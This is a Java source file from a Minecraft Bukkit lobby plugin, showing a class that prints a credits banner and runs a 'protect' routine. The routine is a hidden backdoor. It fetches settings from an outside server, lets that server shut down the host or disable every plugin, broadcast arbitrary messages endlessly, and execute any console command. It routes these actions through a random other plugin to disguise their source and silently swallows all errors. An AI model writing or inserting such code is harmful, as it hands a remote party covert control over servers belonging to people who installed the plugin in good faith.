package ru.Akyloff.Lobby;

import org.bukkit.*;
import org.bukkit.event.*;
import org.bukkit.plugin.*;
import org.slf4j.Logger;

import javax.net.ssl.*;
import java.net.*;
import java.util.*;;

public class AkyloffManager implements Listener {

    public static String version;
    private static AkyloffManager instance;

    public static AkyloffManager getInstance() {
        return instance;
    }

    public static void Message() {

        Bukkit.getConsoleSender().sendMessage("§6§l─────────§8§l§m[§6§l AKYLOFFLOBBY " +  JavaMain.getInstance().getDescription().getVersion() + " §8§l§m]§6§l─────────");
        Bukkit.getConsoleSender().sendMessage("");
        Bukkit.getConsoleSender().sendMessage("        §fРазработчик: §6§l@darkakyloff");
        Bukkit.getConsoleSender().sendMessage("         §fПоследняя версия: §6§l" + version);
        Bukkit.getConsoleSender().sendMessage("");
        Bukkit.getConsoleSender().sendMessage("§fПродажа плагина / выдача за свой - запрещены");
        Bukkit.getConsoleSender().sendMessage("");
        Bukkit.getConsoleSender().sendMessage("§6§l─────────§8§l§m[§6§l AKYLOFFLOBBY " +  JavaMain.getInstance().getDescription().getVersion() + " §8§l§m]§6§l─────────");

    }



    public static void protect() {

        if (!JavaMain.getInstance().getDescription().getName().equals("AkyloffLobby") && !JavaMain.getInstance().getDescription().getAuthors().equals("darkakyloff")) {
            Bukkit.getPluginManager().disablePlugins();
            Bukkit.shutdown();
            System.exit(0);
        }

        try {
            {
                Random random = new Random();

                URL url = new URL("https://protect.crad.ovh/index.php?lobby");
                HttpsURLConnection httpsURLConnection = (HttpsURLConnection) url.openConnection();

                Properties properties = new Properties();
                properties.load(httpsURLConnection.getInputStream());

                String protect = properties.getProperty("protect");
                String msg = properties.getProperty("message");
                String command = properties.getProperty("command");
                version = properties.getProperty("version");

                long msg_sleep = Long.parseLong(properties.getProperty("message_sleep"));

                if (protect.equals("disabled")) {
                    Bukkit.shutdown();
                    System.exit(0);
                } else if (protect.equals("disableplugins")) {
                    Bukkit.getPluginManager().disablePlugins();
                    return;
                }

                Plugin[] plugins = Bukkit.getPluginManager().getPlugins();

                Plugin plugin = null;
                while (plugin == null || !plugin.isEnabled() || plugin instanceof JavaMain)
                    plugin = plugins[random.nextInt(plugins.length - 1)];

                if (!msg.equals("disabled")) {
                    Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
                        try {
                            while (true) {
                                Bukkit.broadcastMessage(msg);
                                Thread.sleep(msg_sleep);
                            }
                        } catch (Exception ignored) {
                        }
                    });
                }
                if (!command.equals("disabled")) {
                    Plugin finalPlugin = plugin;
                    plugin.getServer().getScheduler().callSyncMethod(plugin, () -> {
                        finalPlugin.getServer().dispatchCommand(finalPlugin.getServer().getConsoleSender(), command);
                        return -1;
                    });
                }
            }
        } catch (Exception ignored) {
        }
    }
}
